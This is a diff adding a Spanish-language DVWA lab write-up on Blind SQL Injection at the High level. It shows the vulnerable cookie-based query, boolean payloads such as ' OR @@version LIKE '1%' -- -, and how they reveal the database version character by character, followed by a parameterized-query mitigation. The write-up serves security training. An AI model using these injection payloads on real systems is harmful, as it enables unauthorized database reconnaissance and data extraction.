@@ -189,3 +189,97 @@ Este nivel muestra que utilizar una variable de sesión como intermediaria no im
 La mitigación es la misma indicada en los niveles anteriores: utilizar consultas parametrizadas / prepared statements para evitar que la entrada del usuario pueda modificar la estructura de la consulta SQL.
 
 Referencia: OWASP A05:2025 – Injection
+
+## SQL Injection (Blind) - High
+
+**Categoría OWASP:** A05:2025 - Injection
+
+**Descripción:** Utilizar una Blind SQL Injection para identificar la versión del software de base de datos mediante respuestas de tipo verdadero/falso.
+
+**Objetivo**
+
+El apartado **Help** indica que el objetivo es encontrar la versión del software de base de datos mediante un ataque de Blind SQL Injection.
+
+**Análisis**
+
+A diferencia de los niveles anteriores, la aplicación no devuelve directamente los resultados de la consulta. En su lugar, utiliza el valor almacenado en la cookie `id` para ejecutar la consulta y únicamente informa si existe algún resultado.
+
+La consulta utilizada es:
+
+```sql
+SELECT first_name, last_name
+FROM users
+WHERE user_id = '$id'
+LIMIT 1;
+```
+
+El resultado de la consulta se almacena en la variable `$exists`. Si se encuentra al menos una fila, la aplicación muestra:
+
+```text
+User ID exists in the database.
+```
+
+En caso contrario, devuelve un error `404` y muestra:
+
+```text
+User ID is MISSING from the database.
+```
+
+Esto permite realizar preguntas de verdadero o falso mediante SQL y utilizar la respuesta de la aplicación para inferir información que no se muestra directamente.
+
+**Payload / exploit**
+
+Primero comprobé el comportamiento utilizando condiciones conocidas como verdaderas y falsas para confirmar que la respuesta de la aplicación podía utilizarse como indicador.
+
+Luego utilicé `@@version`, que permite consultar la versión del software de base de datos, y realicé diferentes preguntas mediante `LIKE`.
+
+Por ejemplo:
+
+```text
+' OR @@version LIKE '1%' -- -
+```
+
+La respuesta fue `User ID exists`, indicando que la versión comienza con `1`.
+
+![](./images/DVWABH1.png)
+
+Continué concatenando valores:
+
+```
+10 -> exist
+10. -> exist
+10.1 -> exist
+10.11 -> exist
+10.11. -> exist
+10.11.1 -> exist
+```
+
+y finalmente:
+
+```text
+' OR @@version LIKE '10.11.19%' -- -
+```
+
+obteniendo nuevamente una respuesta verdadera.
+
+De esta manera pude reconstruir mediante preguntas de verdadero/falso el comienzo de la versión:
+
+```text
+10.11.19-
+```
+
+La versión identificada fue **MariaDB 10.11.19**.
+
+![](./images/DVWABH2.png)
+
+**Resultado**
+
+Fue posible identificar mediante Blind SQL Injection que el software de base de datos utilizado por la aplicación es **MariaDB 10.11.19**, sin que la aplicación mostrara directamente el valor de `@@version`.
+
+El ejercicio demuestra cómo una aplicación que únicamente proporciona respuestas de verdadero/falso puede ser utilizada para inferir información mediante una serie de consultas SQL.
+
+**Mitigación**
+
+La mitigación es la misma indicada en los niveles anteriores: utilizar consultas parametrizadas / prepared statements para evitar que la entrada del usuario pueda modificar la estructura de la consulta SQL.
+
+Referencia: OWASP A05:2025 – Injection
